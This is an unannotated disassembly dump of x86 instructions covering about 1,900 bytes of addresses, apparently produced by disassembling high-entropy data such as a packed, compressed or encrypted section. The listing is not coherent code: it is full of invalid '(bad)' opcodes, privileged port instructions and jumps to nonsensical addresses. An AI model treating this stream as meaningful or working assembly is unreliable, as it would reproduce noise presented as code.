  417701:	sbb    DWORD PTR [esi],ebx
  417703:	pushf  
  417704:	lods   eax,DWORD PTR ds:[esi]
  417705:	ins    BYTE PTR es:[edi],dx
  417706:	and    eax,0xc088a62b
  41770b:	jl     0x4176e3
  41770d:	xor    al,0xa6
  41770f:	cmp    BYTE PTR [ecx],dh
  417711:	push   edx
  417712:	aad    0xb0
  417714:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417715:	fs ret 
  417717:	fdivr  QWORD PTR [edi-0x21]
  41771a:	js     0x417797
  41771c:	jns    0x4176ac
  41771e:	sub    DWORD PTR [ecx+eax*1+0xd5cbc58],ecx
  417725:	clc    
  417726:	dec    edx
  417727:	cmp    dh,0xf9
  41772a:	and    eax,0xf4e6080f
  41772f:	xor    ecx,esi
  417731:	sbb    DWORD PTR [ebp+0x18],edx
  417734:	push   eax
  417735:	rcl    DWORD PTR [eax],cl
  417737:	jmp    0xa4f232d7
  41773c:	jge    0x417780
  41773e:	or     eax,0x8cfff325
  417743:	add    BYTE PTR ss:[edi+eiz*1-0x76e61bde],ah
  41774b:	sub    BYTE PTR [ecx],dl
  41774d:	icebp  
  41774e:	stos   BYTE PTR es:[edi],al
  41774f:	arpl   WORD PTR [ebx-0x8],ax
  417752:	lea    esi,[ebx+0x51]
  417755:	add    al,0x9a
  417757:	xor    eax,0x3f49af9
  41775c:	add    DWORD PTR [ecx-0x64],ebx
  41775f:	inc    edx
  417760:	lods   eax,DWORD PTR ds:[esi]
  417761:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417762:	imul   esi,DWORD PTR [esi-0x315e82ec],0xffffff8f
  417769:	mov    al,ds:0xcf4f0e20
  41776e:	cli    
  41776f:	outs   dx,DWORD PTR ds:[esi]
  417770:	fild   QWORD PTR [edx]
  417772:	pop    esp
  417773:	into   
  417774:	jnp    0x41773a
  417776:	imul   edi,DWORD PTR [edi],0x4a18df4a
  41777c:	mov    ebp,0x151a2d4a
  417781:	je     0x41774c
  417783:	scas   al,BYTE PTR es:[edi]
  417784:	xor    cl,BYTE PTR [esi+ebp*8+0x7e5b1309]
  41778b:	dec    ecx
  41778c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41778d:	mov    edx,0xcaead9cc
  417792:	sub    edx,edx
  417794:	push   0xde5819d
  417799:	sbb    BYTE PTR [esi+0x53f304ae],cl
  41779f:	push   ecx
  4177a0:	loope  0x4177f6
  4177a2:	xchg   DWORD PTR [edx+edi*4-0x166a41eb],esp
  4177a9:	mov    eax,ds:0x47fadd19
  4177ae:	pop    esi
  4177af:	cmovge edx,DWORD PTR [ecx-0x56a29acd]
  4177b6:	shl    DWORD PTR [esi],1
  4177b8:	fld    TBYTE PTR [ecx+0x2dabc4ec]
  4177be:	into   
  4177bf:	ret    
  4177c0:	inc    ebp
  4177c1:	add    DWORD PTR [esp+ebp*2-0x44],ecx
  4177c5:	fild   QWORD PTR [eax+0x15ddde7b]
  4177cb:	xor    DWORD PTR [edi+0x4f1ae4d7],esp
  4177d1:	int3   
  4177d2:	inc    edx
  4177d3:	or     eax,0x250f3593
  4177d8:	dec    ebp
  4177d9:	xchg   ebp,eax
  4177da:	or     eax,0x3e6e361c
  4177df:	mov    ds:0x6eb91c57,eax
  4177e4:	add    dl,bh
  4177e6:	pop    edi
  4177e7:	mov    esp,0x4fd2c18f
  4177ec:	pop    ebp
  4177ed:	sub    BYTE PTR [ebx+ecx*8-0x49],dl
  4177f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177f2:	xchg   esp,eax
  4177f3:	add    BYTE PTR [ebp-0x5c],bl
  4177f6:	cmp    dl,BYTE PTR [ebp+0x676409bf]
  4177fc:	ja     0x4177ee
  4177fe:	dec    esp
  4177ff:	dec    edi
  417800:	lea    ecx,[edi]
  417802:	cmp    DWORD PTR [ecx-0x56aa5376],esi
  417808:	sbb    BYTE PTR [ecx+0x3fab047b],ah
  41780e:	xchg   ebp,eax
  41780f:	jecxz  0x417833
  417811:	add    BYTE PTR [ebx],0x9
  417814:	ret    0x673d
  417817:	push   ds
  417818:	mov    ds,edx
  41781a:	push   0xffffffa9
  41781c:	inc    ebx
  41781d:	gs sbb bh,al
  417820:	pop    esp
  417821:	push   0x7d
  417823:	cld    
  417824:	xchg   ebp,eax
  417825:	add    ebp,DWORD PTR [edi-0x57]
  417828:	enter  0xeb8,0x60
  41782c:	pop    ds
  41782d:	iret   
  41782e:	pop    ebx
  41782f:	lahf   
  417830:	lods   al,BYTE PTR ds:[esi]
  417831:	ret    
  417832:	ds jb  0x417822
  417835:	cwde   
  417836:	xor    al,BYTE PTR [eax]
  417838:	gs push ebp
  41783a:	mov    al,0x27
  41783c:	mov    esp,DWORD PTR [ecx]
  41783e:	mov    al,0x4b
  417840:	leave  
  417841:	aas    
  417842:	enter  0x59a9,0x89
  417846:	test   al,0x6b
  417848:	and    eax,0xa6746643
  41784d:	aad    0xc0
  41784f:	add    al,0xc
  417851:	(bad)  
  417852:	pop    edi
  417853:	les    ecx,FWORD PTR [eax-0x52]
  417856:	ja     0x417840
  417858:	lea    eax,[edi-0x593b7a0c]
  41785e:	xor    BYTE PTR [ecx],cl
  417860:	in     eax,0x75
  417862:	jl     0x417830
  417864:	adc    al,0x94
  417866:	cli    
  417867:	push   eax
  417868:	jg     0x4178dd
  41786a:	lods   eax,DWORD PTR ds:[esi]
  41786b:	lods   eax,DWORD PTR ds:[esi]
  41786c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41786d:	test   al,0x52
  41786f:	repz (bad) 
  417871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417872:	shl    edx,1
  417874:	idiv   DWORD PTR [edi+edx*4-0x416becc1]
  41787b:	mov    DWORD PTR [esi-0x12],esi
  41787e:	add    esp,0x5ad0f62d
  417884:	js     0x4178c3
  417886:	jl     0x41780f
  417888:	sbb    eax,0xacf56226
  41788d:	mov    ds:0x9e7641bf,al
  417892:	sbb    DWORD PTR [esp+edx*8],esi
  417895:	mov    al,ds:0xc51b7395
  41789a:	pop    edi
  41789b:	fldenv [ebx+0x7508401b]
  4178a1:	mov    ecx,0x42f8e38e
  4178a6:	push   edi
  4178a7:	ss aad 0x36
  4178aa:	int    0x97
  4178ac:	popa   
  4178ad:	ret    0xd98b
  4178b0:	cwde   
  4178b1:	imul   ebp,DWORD PTR [eax-0x4e198b2f],0xffffff9c
  4178b8:	dec    edx
  4178b9:	add    BYTE PTR [ebx+esi*8+0x1e],ch
  4178bd:	mov    ds:0xebd12c35,eax
  4178c2:	jg     0x417879
  4178c4:	in     eax,dx
  4178c5:	repz pushf 
  4178c7:	sub    bl,BYTE PTR ds:0xef1d6963
  4178cd:	retf   
  4178ce:	adc    bh,bl
  4178d0:	add    al,0x90
  4178d2:	test   BYTE PTR [ebx],bh
  4178d4:	mov    esi,0xd04e21e9
  4178d9:	xor    BYTE PTR [ecx+0x7c5f13bb],cl
  4178df:	out    0x18,eax
  4178e1:	repz repnz inc edx
  4178e4:	fisttp DWORD PTR [esi+0x5cb0cf88]
  4178ea:	cmp    eax,0x32cd93e7
  4178ef:	mov    dl,0xd1
  4178f1:	nop
  4178f2:	cmc    
  4178f3:	lock leave 
  4178f5:	pop    ebx
  4178f6:	or     BYTE PTR [edi+0x76],0x2a
  4178fa:	adc    dh,dl
  4178fc:	sbb    BYTE PTR [eax-0x56],dh
  4178ff:	mov    ?,WORD PTR [ebx+0x70]
  417902:	pushf  
  417903:	sar    BYTE PTR [edx-0x3ff91859],cl
  417909:	xchg   edx,eax
  41790a:	or     DWORD PTR ds:0x39450340,edx
  417910:	rcr    DWORD PTR [edi+0xd],0x8b
  417914:	out    0x5a,eax
  417916:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417917:	(bad)  
  417918:	jnp    0x417972
  41791a:	pop    esi
  41791b:	dec    edx
  41791c:	fwait
  41791d:	pop    es
  41791e:	clc    
  41791f:	aaa    
  417920:	cli    
  417921:	repnz mov esp,0xdbe5ba7
  417927:	retf   
  417928:	mov    ebp,0x86c52ad8
  41792d:	and    ecx,DWORD PTR [ecx-0x2d]
  417930:	popf   
  417931:	xlat   BYTE PTR ds:[ebx]
  417932:	and    DWORD PTR [esp+edx*2],edi
  417935:	mov    esi,0xc2533740
  41793a:	jmp    0x4179b7
  41793c:	adc    eax,0x75f2adb4
  417941:	dec    dx
  417943:	mov    eax,0xf2c0b5de
  417948:	popf   
  417949:	shl    DWORD PTR [esi+0x46],cl
  41794c:	aad    0x3
  41794e:	fwait
  41794f:	shl    ch,0x13
  417952:	adc    BYTE PTR [esi-0x37bb5ac2],dl
  417958:	jb     0x41795d
  41795a:	cs mov cl,0x3f
  41795d:	iret   
  41795e:	xchg   esp,eax
  41795f:	push   edx
  417960:	push   ds
  417961:	clc    
  417962:	(bad)  
  417963:	icebp  
  417964:	arpl   WORD PTR [ebx+0x75],bp
  417967:	jb     0x41796d
  417969:	jns    0x417978
  41796b:	sub    ch,BYTE PTR [edi]
  41796d:	mov    WORD PTR [edi+0x15],fs
  417970:	dec    edi
  417971:	lahf   
  417972:	int3   
  417973:	adc    DWORD PTR [esp+ecx*1+0x72],ebp
  417977:	rcr    DWORD PTR [ebp*1-0x7abd1320],0xe2
  41797f:	icebp  
  417980:	(bad)
  417984:	test   al,0x5f
  417986:	push   esp
  417987:	cdq    
  417988:	sar    BYTE PTR [edi+0x0],cl
  41798b:	scas   eax,DWORD PTR es:[edi]
  41798c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41798d:	icebp  
  41798e:	push   esi
  41798f:	test   al,0x6d
  417991:	adc    dl,BYTE PTR [eax]
  417993:	mov    edi,ebp
  417995:	out    0xb,al
  417997:	dec    ebx
  417998:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417999:	mov    edx,0xb4f1d005
  41799e:	jns    0x41794a
  4179a0:	pop    ecx
  4179a1:	mov    bh,0x52
  4179a3:	jbe    0x417956
  4179a5:	enter  0x3cae,0x61
  4179a9:	push   esp
  4179aa:	xor    DWORD PTR [eax+0x45bc0f5f],esp
  4179b0:	pop    esi
  4179b1:	loopne 0x4179c1
  4179b3:	repnz retf 0x849c
  4179b7:	xor    ebp,DWORD PTR [ecx]
  4179b9:	clc    
  4179ba:	mov    edi,0x4391f75
  4179bf:	loopne 0x417a40
  4179c1:	pop    edx
  4179c2:	test   dl,bl
  4179c4:	test   al,0x8b
  4179c6:	mov    edx,0xd3dbf0e8
  4179cb:	cli    
  4179cc:	cmp    al,BYTE PTR [edx+ecx*8-0x3e]
  4179d0:	(bad)  
  4179d1:	xchg   esp,eax
  4179d2:	mov    ds:0x84b46c09,eax
  4179d7:	(bad)  
  4179d9:	jg     0x417998
  4179db:	xor    DWORD PTR [edx-0x6a],edi
  4179de:	jge    0x417996
  4179e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179e1:	out    dx,al
  4179e2:	adc    ebp,DWORD PTR [eax-0x2f]
  4179e5:	out    0xa2,eax
  4179e7:	mov    eax,0xa333bfa9
  4179ec:	in     al,0xe
  4179ee:	and    ah,BYTE PTR [edi]
  4179f0:	and    ebp,DWORD PTR [edx+0x3673e85f]
  4179f6:	mov    dh,BYTE PTR [ebx]
  4179f8:	dec    esi
  4179f9:	cmp    bl,bh
  4179fb:	jb     0x417a37
  4179fd:	imul   edi,DWORD PTR [eax],0xffffffce
  417a00:	mov    DWORD PTR [esi+0x6a4f2b9a],esi
  417a06:	ss push cs
  417a08:	mov    ebp,0xae7a321f
  417a0d:	jmp    0x2784:0x5c4f35de
  417a14:	push   esp
  417a15:	lock cdq 
  417a17:	add    al,0x98
  417a19:	cmp    DWORD PTR [ebp+0x89fc947],ebx
  417a1f:	clc    
  417a20:	cld    
  417a21:	(bad)  
  417a22:	(bad)  
  417a23:	stos   DWORD PTR es:[edi],eax
  417a24:	xor    ebx,ecx
  417a26:	into   
  417a27:	cld    
  417a28:	xor    al,0x4e
  417a2a:	jecxz  0x417a34
  417a2c:	jb     0x417a03
  417a2e:	ret    0x37df
  417a31:	(bad)  [esi+0x7b]
  417a34:	add    DWORD PTR [edx-0x5c9017c6],0x29fc0263
  417a3e:	inc    ecx
  417a3f:	sub    al,0x78
  417a41:	stos   DWORD PTR es:[edi],eax
  417a42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a43:	xchg   edx,ecx
  417a45:	sbb    BYTE PTR ds:0xbb02e027,bh
  417a4b:	sub    eax,0xa2a2b5d3
  417a50:	jmp    0x417aa0
  417a52:	in     al,0xda
  417a54:	adc    eax,0xe96ceaae
  417a59:	sub    DWORD PTR [esi-0x53],eax
  417a5c:	add    DWORD PTR [edi+0x6f],eax
  417a5f:	ins    BYTE PTR es:[edi],dx
  417a60:	sbb    eax,DWORD PTR [ebx+0x2d54c42a]
  417a66:	neg    cl
  417a68:	push   ebx
  417a69:	add    al,0x42
  417a6b:	add    dl,BYTE PTR [edx]
  417a6d:	add    DWORD PTR [edx+ebp*4-0x79],0xffffffda
  417a72:	aaa    
  417a73:	mov    bl,0xfb
  417a75:	and    DWORD PTR ds:0x71f3eb0d,ebx
  417a7b:	dec    edx
  417a7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a7d:	cmp    al,BYTE PTR [ebx-0x13238dec]
  417a83:	(bad)  [ecx-0x5ea8d5]
  417a89:	dec    edi
  417a8a:	mov    eax,0x846bd0c3
  417a8f:	aam    0x34
  417a91:	xor    edi,esi
  417a93:	std    
  417a94:	mov    edi,0xc504674d
  417a99:	push   ds
  417a9a:	fstp   QWORD PTR fs:[esi+eax*1+0x561bc5a7]
  417aa2:	fst    DWORD PTR [esi-0x673aa23d]
  417aa8:	jge    0x417a35
  417aaa:	add    BYTE PTR [ebx-0x3f70fafb],al
  417ab0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ab1:	aas    
  417ab2:	(bad)  
  417ab3:	popf   
  417ab4:	push   esp
  417ab5:	mov    ch,0xbe
  417ab7:	push   ebx
  417ab8:	push   esp
  417ab9:	jne    0x417b34
  417abb:	mov    DWORD PTR [esi-0x3045935d],eax
  417ac1:	mov    ebx,0x896c2e66
  417ac6:	mov    eax,0xd46cb41d
  417acb:	std    
  417acc:	jno    0x417a77
  417ace:	add    dh,BYTE PTR [edx-0x13]
  417ad1:	into   
  417ad2:	and    edi,esi
  417ad4:	shl    DWORD PTR [esi+edx*4],1
  417ad7:	sbb    DWORD PTR [ecx+edx*2],ecx
  417ada:	les    ebp,FWORD PTR [edx-0x22]
  417add:	inc    DWORD PTR [esi+0x24]
  417ae0:	cmp    al,0xae
  417ae2:	fucomi st,st(3)
  417ae4:	jno    0x417ab5
  417ae6:	xlat   BYTE PTR ds:[ebx]
  417ae7:	(bad)  
  417ae8:	(bad)  
  417aea:	popf   
  417aeb:	mov    cl,0x77
  417aed:	mov    ch,0x3c
  417aef:	scas   eax,DWORD PTR es:[edi]
  417af0:	je     0x417ae0
  417af2:	sub    al,0x83
  417af4:	pop    eax
  417af5:	mov    eax,ds:0xaaa64dde
  417afa:	mov    bl,0x75
  417afc:	mov    ch,0x63
  417afe:	sub    al,0xd3
  417b00:	ret    0x6752
  417b03:	pusha  
  417b04:	daa    
  417b05:	or     DWORD PTR [esi],edi
  417b07:	clc    
  417b08:	dec    ebx
  417b09:	mov    dl,0x29
  417b0b:	xor    BYTE PTR [edx+0x2d7274af],bh
  417b11:	pop    ds
  417b12:	test   al,ah
  417b14:	adc    eax,0x2fc0aff2
  417b19:	cmp    edx,DWORD PTR [esi]
  417b1b:	in     eax,0x20
  417b1d:	shl    esp,cl
  417b1f:	inc    dl
  417b21:	repnz add BYTE PTR [esp+esi*1+0x58],ch
  417b26:	push   ebx
  417b27:	mov    dh,0x74
  417b29:	div    BYTE PTR [eax+edi*8+0x71]
  417b2d:	je     0x417abc
  417b2f:	cwde   
  417b30:	jmp    0x5fe4:0xfd76f2d6
  417b37:	jl     0x417b3a
  417b39:	xor    esi,DWORD PTR es:[ecx+ecx*1+0x4c196ea3]
  417b41:	add    bh,ah
  417b43:	sbb    ebx,esi
  417b45:	jge    0x417b88
  417b47:	jmp    0x417b21
  417b49:	mov    dl,0x8d
  417b4b:	dec    edx
  417b4c:	dec    edx
  417b4d:	mov    edx,0x42d3676a
  417b52:	mov    ds:0xa8955496,al
  417b57:	sbb    DWORD PTR [ecx+0x5ffbdd25],edx
  417b5d:	and    DWORD PTR [eax-0x7d],ebx
  417b60:	push   edi
  417b61:	push   edi
  417b62:	clc    
  417b63:	pop    esp
  417b64:	push   cs
  417b65:	call   DWORD PTR [edx-0x12]
  417b68:	stc    
  417b69:	and    dl,bh
  417b6b:	push   0xa6d356f2
  417b70:	xchg   esi,eax
  417b71:	xor    DWORD PTR [esi],ebp
  417b73:	loope  0x417bcc
  417b75:	mov    ah,0xea
  417b77:	xor    ah,BYTE PTR [ebx+ebx*1+0x642acc05]
  417b7e:	mov    ah,0x6
  417b80:	xor    edx,DWORD PTR [ecx+edx*1]
  417b83:	pushf  
  417b84:	mov    eax,0xa27ed276
  417b89:	mov    al,ds:0xb73e2e27
  417b8e:	jmp    0x18074b79
  417b93:	cwde   
  417b94:	rcr    DWORD PTR ds:0xe5687da0,cl
  417b9a:	lea    edi,[ebx]
  417b9c:	js     0x417b73
  417b9e:	push   0x859a6bec
  417ba3:	int3   
  417ba4:	sbb    BYTE PTR [edx],dh
  417ba6:	ret    0xc709
  417ba9:	iret   
  417baa:	jmp    0x417b7a
  417bac:	xor    bp,dx
  417baf:	mov    ch,0xa8
  417bb1:	mov    ah,0xcd
  417bb3:	scas   al,BYTE PTR es:[edi]
  417bb4:	cdq    
  417bb5:	ins    BYTE PTR es:[edi],dx
  417bb6:	test   eax,0xc56fde10
  417bbb:	es ja  0x417bff
  417bbe:	not    BYTE PTR [eax]
  417bc0:	mov    ecx,0x9cea443e
  417bc5:	mov    eax,DWORD PTR [eax]
  417bc7:	add    ebx,ebx
  417bc9:	inc    esp
  417bca:	mov    bl,0xf
  417bcc:	sti    
  417bcd:	ins    BYTE PTR es:[edi],dx
  417bce:	add    DWORD PTR [edi+edi*2],esi
  417bd1:	pop    edi
  417bd2:	rol    DWORD PTR [ebx+0x1006ecf4],1
  417bd8:	inc    ebx
  417bd9:	push   eax
  417bda:	adc    al,0xbd
  417bdc:	xchg   ah,ah
  417bde:	les    ebx,FWORD PTR [eax-0x72]
  417be1:	pop    esp
  417be2:	inc    esi
  417be3:	push   ecx
  417be4:	jnp    0x417c0b
  417be6:	test   DWORD PTR [edi+0x5382560b],0x99730a8e
  417bf0:	adc    BYTE PTR [edx-0x369a66a9],0x3
  417bf7:	push   ebp
  417bf8:	repz int3 
  417bfa:	adc    eax,0x385bba74
  417bff:	mov    ebx,0xb90ccc56
  417c04:	rcr    DWORD PTR [eax],1
  417c06:	cmp    dh,ah
  417c08:	push   edx
  417c09:	retf   
  417c0a:	mov    al,0xf8
  417c0c:	mov    edi,0xe9a0f848
  417c11:	rcr    DWORD PTR [edx+0x50f5ae62],cl
  417c17:	mov    ebp,0x46ec354d
  417c1c:	sahf   
  417c1d:	lahf   
  417c1e:	push   esi
  417c1f:	xlat   BYTE PTR ds:[ebx]
  417c20:	dec    esp
  417c21:	or     edi,DWORD PTR [esi-0x33bf9263]
  417c27:	in     al,dx
  417c28:	push   0xe271ec4d
  417c2d:	mov    dl,0x61
  417c2f:	loope  0x417be7
  417c31:	ins    DWORD PTR es:[edi],dx
  417c32:	and    eax,0x4e4cf587
  417c37:	loope  0x417c9c
  417c39:	sbb    eax,0xf7568a40
  417c3e:	scas   al,BYTE PTR es:[edi]
  417c3f:	add    ecx,DWORD PTR [eax+ecx*8-0x47671b44]
  417c46:	xchg   ebx,eax
  417c47:	jne    0x417c75
  417c49:	dec    ecx
  417c4a:	jmp    0x417c9d
  417c4c:	xchg   ebx,eax
  417c4d:	ins    BYTE PTR es:[edi],dx
  417c4e:	stc    
  417c4f:	dec    ebp
  417c50:	lods   eax,DWORD PTR ds:[esi]
  417c51:	xchg   ebp,eax
  417c52:	xor    DWORD PTR [edx],edi
  417c54:	push   edi
  417c55:	in     eax,dx
  417c56:	cmp    BYTE PTR [edx+0x65],bl
  417c59:	mov    eax,0x1b7ae2a0
  417c5e:	mov    cl,0x15
  417c60:	and    ebp,esi
  417c62:	call   0xb8bbe60a
  417c67:	div    DWORD PTR [ecx]
  417c69:	in     eax,dx
  417c6a:	sub    dl,dl
  417c6c:	cwde   
  417c6d:	adc    ecx,esp
  417c6f:	mov    ebp,0xbdb667eb
  417c74:	or     bl,BYTE PTR [ebx]
  417c76:	cdq    
  417c77:	ret    0xe221
  417c7a:	repnz scas eax,DWORD PTR es:[edi]
  417c7c:	fild   WORD PTR [esi+ecx*8]
  417c7f:	fimul  WORD PTR [edi]
  417c81:	inc    ebp
  417c82:	gs sub dl,ah
  417c85:	cmp    al,0xd9
  417c87:	aam    0x63
  417c89:	dec    eax
  417c8a:	pop    es
  417c8b:	adc    BYTE PTR [edi+0x6db017fe],ah
  417c91:	loop   0x417ce0
  417c93:	gs addr16 sti 
  417c96:	dec    ebx
  417c97:	shl    DWORD PTR [ecx+0x1ae7e123],1
  417c9d:	add    al,0xd7
  417c9f:	mov    ebp,0xc60990a9
  417ca4:	jnp    0x417c60
  417ca6:	sbb    DWORD PTR [edx+esi*4-0x40376d15],ebx
  417cad:	stos   DWORD PTR es:[edi],eax
  417cae:	push   es
  417caf:	jecxz  0x417c47
  417cb1:	pop    ss
  417cb2:	push   edx
  417cb3:	sar    bh,1
  417cb5:	jb     0x417c72
  417cb7:	add    BYTE PTR [edx-0x24ae8ca0],cl
  417cbd:	pop    ebx
  417cbe:	sbb    al,0x84
  417cc0:	fld    TBYTE PTR [ebx-0x17a8cce4]
  417cc6:	push   ebx
  417cc7:	addr16 and al,0x8e
  417cca:	lea    eax,[eax+0x154b1d5d]
  417cd0:	jecxz  0x417c95
  417cd2:	fimul  DWORD PTR [esi]
  417cd4:	pop    es
  417cd5:	sub    ebp,DWORD PTR [ecx+ecx*8+0x6197f1cf]
  417cdc:	push   esp
  417cdd:	(bad)  
  417cde:	push   ss
  417cdf:	xchg   DWORD PTR [ebp+0x16],edi
  417ce2:	sub    al,0x5a
  417ce5:	sub    ch,0xab
  417ce8:	sbb    DWORD PTR [edx-0x383acd61],0x126dc28e
  417cf2:	push   es
  417cf3:	push   ds
  417cf4:	je     0x417d18
  417cf6:	mul    BYTE PTR [ecx]
  417cf8:	inc    esp
  417cf9:	out    dx,al
  417cfa:	(bad)
  417cfd:	sub    DWORD PTR [ebx],edx
  417cff:	push   eax
  417d00:	mov    eax,ds:0xae807235
  417d05:	xlat   BYTE PTR ds:[ebx]
  417d06:	shl    DWORD PTR [ecx],cl
  417d08:	and    BYTE PTR [edx],bh
  417d0a:	retf   0xdcfd
  417d0d:	pop    ss
  417d0e:	push   0xffffffb7
  417d10:	push   cs
  417d11:	jecxz  0x417d30
  417d13:	dec    esp
  417d14:	add    eax,0x20f5e713
  417d19:	mov    bl,0x3a
  417d1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d1c:	add    DWORD PTR [ebp-0x5c],ebp
  417d1f:	in     eax,dx
  417d20:	fucom  st(0)
  417d22:	cmc    
  417d23:	into   
  417d24:	test   DWORD PTR [eax+0x13],ebp
  417d27:	or     BYTE PTR [esi+0x398df660],dh
  417d2d:	xor    eax,0xeb223f5
  417d32:	dec    esi
  417d33:	outs   dx,DWORD PTR ds:[esi]
  417d34:	out    0xb,al
  417d36:	mov    gs,WORD PTR [ebp-0x2058d802]
  417d3c:	bound  esi,QWORD PTR [esp+eiz*4-0x37]
  417d40:	or     DWORD PTR ds:0x784d4730,0x7e
  417d47:	adc    eax,0x3999948e
  417d4c:	(bad)  
  417d4d:	cli    
  417d4e:	outs   dx,BYTE PTR ds:[esi]
  417d4f:	in     eax,dx
  417d50:	or     al,0xf3
  417d52:	cdq    
  417d53:	jae    0x417d6f
  417d55:	fmul   DWORD PTR [eax+eiz*4]
  417d58:	ret    0xa67e
  417d5b:	dec    ebx
  417d5c:	mov    eax,ds:0x2ec3555c
  417d61:	adc    esi,DWORD PTR [edi+0x149b7ef5]
  417d67:	mov    edx,0xbdb99427
  417d6c:	int3   
  417d6d:	aaa    
  417d6e:	sub    eax,0x4dc47b6b
  417d73:	shr    BYTE PTR [ebp-0x65],cl
  417d76:	shl    BYTE PTR [ecx],cl
  417d78:	test   BYTE PTR [edi-0xca736da],ah
  417d7e:	dec    esp
  417d7f:	dec    edi
  417d80:	inc    ebp
  417d81:	inc    edx
  417d82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d83:	test   DWORD PTR [esi],ebp
  417d85:	mov    ds:0x757d18a2,eax
  417d8a:	aaa    
  417d8b:	mov    eax,0x6ee3bc82
  417d90:	mov    ds:0x3f9a3ee2,eax
  417d95:	lea    ebp,[esi]
  417d97:	aad    0x75
  417d99:	or     eax,0xb11f8fb1
  417d9e:	dec    edx
  417d9f:	lods   eax,DWORD PTR ds:[esi]
  417da0:	(bad)  
  417da1:	in     al,dx
  417da2:	mov    DWORD PTR [ecx+0x66],ebp
  417da5:	lds    ebx,FWORD PTR [ebp-0x9283ae7]
  417dab:	add    BYTE PTR [esi],ch
  417dad:	and    al,0xac
  417daf:	les    eax,FWORD PTR [eax]
  417db1:	push   edx
  417db2:	(bad)  
  417db3:	xor    edi,DWORD PTR [ebx]
  417db5:	fadd   QWORD PTR [ecx]
  417db7:	sti    
  417db8:	mov    dh,0x4f
  417dba:	aas    
  417dbb:	inc    edx
  417dbc:	fwait
  417dbd:	scas   eax,DWORD PTR es:[edi]
  417dbe:	outs   dx,BYTE PTR ds:[esi]
  417dbf:	out    dx,al
  417dc0:	cld    
  417dc1:	stos   BYTE PTR es:[edi],al
  417dc2:	test   DWORD PTR [ebp-0x23aac497],ebx
  417dc8:	inc    ebx
  417dc9:	fld    TBYTE PTR [edx-0xc]
  417dcc:	cmp    DWORD PTR [edi],edi
  417dce:	jns    0x417e23
  417dd0:	in     eax,dx
  417dd1:	or     DWORD PTR [ebx-0x51],esp
  417dd4:	push   ebx
  417dd5:	test   al,0xd6
  417dd7:	ror    DWORD PTR [edx],cl
  417dd9:	xchg   ecx,eax
  417dda:	pop    ebx
  417ddb:	ss lahf 
  417ddd:	enter  0x3282,0x86
  417de1:	dec    edi
  417de2:	add    DWORD PTR [ebx],eax
  417de4:	dec    ecx
  417de5:	fild   DWORD PTR [edi-0x41f74f42]
  417deb:	jno    0x417e61
  417ded:	sub    edx,DWORD PTR [edx-0x10]
  417df0:	add    DWORD PTR [esi],eax
  417df2:	xchg   esp,eax
  417df3:	stos   DWORD PTR es:[edi],eax
  417df4:	and    eax,0xa2fa6552
  417df9:	imul   edx,DWORD PTR [ebx-0x218839dc],0x900c308b
  417e03:	inc    esi
  417e04:	push   eax
  417e05:	adc    eax,0xa0f65f58
  417e0a:	push   esi
  417e0b:	and    al,0x5a
  417e0d:	jge    0x417e3f
  417e0f:	shl    DWORD PTR [edi-0x47],0xbc
  417e13:	jl     0x417e68
  417e15:	inc    ebp
  417e16:	in     al,0x70
  417e18:	jge    0x417e82
  417e1a:	neg    edi
  417e1c:	and    bh,BYTE PTR [esi]
  417e1e:	jecxz  0x417da5
  417e20:	dec    eax
  417e21:	or     bl,BYTE PTR [esi]
  417e23:	mov    ah,0x60
  417e25:	sbb    DWORD PTR [edi-0x21],0x8bdb3d70
  417e2c:	xlat   BYTE PTR ds:[ebx]
  417e2d:	mov    al,0x20
  417e2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e30:	mov    bl,0x6d
  417e32:	pop    esi
  417e33:	mov    ebp,0x1f53d995
  417e38:	test   al,0x0
  417e3a:	fs iret 
  417e3c:	idiv   edx
  417e3e:	int3   
  417e3f:	fstp   DWORD PTR [ecx]
  417e41:	outs   dx,DWORD PTR ds:[esi]
  417e42:	aam    0xc
  417e44:	pop    ds
  417e45:	mov    ebp,0xce426d7f
  417e4a:	fdiv   DWORD PTR [ebp-0x61]
  417e4d:	daa    
  417e4e:	fsub   DWORD PTR [edi+0x55]
  417e51:	push   ecx
  417e52:	mov    cl,0x50
  417e54:	fwait
  417e55:	cmp    eax,0x360aa68f
  417e5a:	xor    eax,0xb8a0caaf
  417e5f:	dec    esp
  417e60:	adc    ah,bh
  417e62:	test   eax,0xf6e79394
  417e67:	js     0x417e69
  417e69:	leave  
  417e6a:	(bad)  
  417e6c:	cmp    ah,BYTE PTR [ebx-0x36]
  417e6f:	dec    edi
  417e70:	aas    
  417e71:	cmp    al,0x19
  417e73:	mov    DWORD PTR [ecx-0x31],eax
  417e76:	loopne 0x417eb1
  417e78:	fs push edx
  417e7a:	adc    eax,0x7f7da170
  417e7f:	sub    ebx,DWORD PTR [edx+edx*2]
  417e82:	ror    BYTE PTR [edx+0x7dd89f3e],1
  417e88:	outs   dx,BYTE PTR ds:[esi]
  417e89:	jns    0x417e28
  417e8b:	icebp  
  417e8c:	mov    ecx,DWORD PTR ds:[edx-0x1b5c3a3d]
  417e93:	push   0x69
  417e95:	lock sub DWORD PTR gs:[ebx+0x688bab13],edi
  417e9d:	pusha  
  417e9e:	cmp    eax,0x7b3f9e97
  417ea3:	cmc    
  417ea4:	ja     0x417e27
  417ea6:	dec    esp
  417ea7:	xchg   bh,dh
  417ea9:	jg     0x417f1e
  417eab:	inc    ecx
  417eac:	outs   dx,BYTE PTR ds:[esi]
  417ead:	popa   
  417eae:	cld    
  417eaf:	das    
  417eb0:	loop   0x417e74
